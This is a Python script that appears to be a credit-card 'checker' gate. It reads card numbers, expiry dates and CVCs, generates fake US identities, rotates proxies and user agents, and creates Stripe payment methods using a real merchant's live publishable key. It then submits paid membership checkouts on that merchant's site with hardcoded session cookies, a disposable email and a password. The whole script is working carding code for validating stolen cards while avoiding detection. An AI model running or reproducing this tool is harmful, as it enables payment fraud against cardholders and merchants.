import requests
import re
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from colorama import Fore, Style
from proxy import reqproxy

#$25
def fake_user():
   response = requests.get('https://randomuser.me/api/1.2/?nat=us')
   data = response.text
   name_match = re.search(r'"first":"(.*?)"', data)
   name = name_match.group(1) if name_match else ''
   last_match = re.search(r'"last":"(.*?)"', data)
   last = last_match.group(1) if last_match else ''
   email_match = re.search(r'"email":"(.*?)"', data)
   email = email_match.group(1) if email_match else ''
   street_match = re.search(r'"street":"(.*?)"', data)
   street = street_match.group(1) if street_match else ''
   city_match = re.search(r'"city":"(.*?)"', data)
   city = city_match.group(1) if city_match else ''
   state_match = re.search(r'"state":"(.*?)"', data)
   state = state_match.group(1) if state_match else ''
   phone_match = re.search(r'"phone":"(.*?)"', data)
   phone = phone_match.group(1) if phone_match else ''
   postcode_match = re.search(r'"postcode":(.*?),', data)
   postcode = postcode_match.group(1) if postcode_match else ''
   return name, last, email, street, city, state, phone, postcode

def Tele4(ccx):
    session, ip_address = reqproxy()
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]
   
    name, last, email, street, city, state, phone, postcode = fake_user()
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=0ed3ead2-6862-4522-94cb-374f5f846bb57c7cef&muid=b76f8a63-0875-40f2-9722-b4929ec2daeb71d0ce&sid=b0e2f2ac-da14-4e88-8043-8e382368e96e308dd1&payment_user_agent=stripe.js%2F8268afb0eb%3B+stripe-js-v3%2F8268afb0eb%3B+split-card-element&referrer=https%3A%2F%2Fadmail.app&time_on_page=46243&key=pk_live_N5DjJRCc7FWwihD6sKYWyOO100C6PwKwp1'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
       id = response.json()['id']
       print(Fore.GREEN + "PM: ",id, "Proxy is Live: ", ip_address, "gatet4" + Style.RESET_ALL)
    except:
           return '#'


# Define the URL and headers
    url = 'https://admail.app/membership-account/membership-checkout?level=1'

    headers1 = {
       'authority': 'admail.app',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://admail.app',
        'referer': 'https://admail.app/membership-account/membership-checkout?level=1',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }
    
    data2 = {
    "AccountNumber": "XXXXXXXXXXXX3134",
    "CardType": "mastercard",
    "ExpirationMonth": "02",
    "ExpirationYear": "2026",
    "autorenew": "1",
    "autorenew_present": "1",
    "bconfirmemail": "thih09089@bugfoo.com",
    "bemail": "thih09089@bugfoo.com",
    "checkjavascript": "1",
    "discount_code": "",
    "first_name": "Mireya",
    "fullname": "",
    "gateway": "stripe",
    "javascriptok": "1,1",
    "last_name": "Homenick",
    "level": "1",
    "other_discount_code": "",
    "password": "Tagiharima28@@Tagiharima28@@",
    "password2": "Tagiharima28@@Tagiharima28@@",
    "payment_method_id": id,
    "submit-checkout": "1,1",
    "tos": "1",
    "username": "thi09089",
    }
    
    cookies = {
    "__stripe_mid": "b76f8a63-0875-40f2-9722-b4929ec2daeb71d0ce",
    "__stripe_sid": "b0e2f2ac-da14-4e88-8043-8e382368e96e308dd1",
    "_ga": "GA1.2.1170590951.1696945443",
    "_ga_JMPXM42DR5": "GS1.2.1696945445.1.1.1696945479.0.0.0",
    "_gid": "GA1.2.679150463.1696945443",
    "_wpjshd_session_": "f99b6194ec463df221cd043e1cc260671228199%2F1696947228%2F1696949028",
    "PHPSESSID": "96e14f4478a14f5bad54aac123829c12",
    "pmpro_visit": "1",
    "wp_wpfileupload_0": "7fPRFB3K2yGwn4EQkqn5sy1etFDXqC8s",
    }
   # Make the POST request
    response = session.post(url, headers=headers1, data=data2, cookies=cookies, verify=False)  # Note: Set verify=False to disable SSL verification
    try:
       result2 = response.text
    except:
	    return "succeeded"
    return result2
print("working gatet 4")
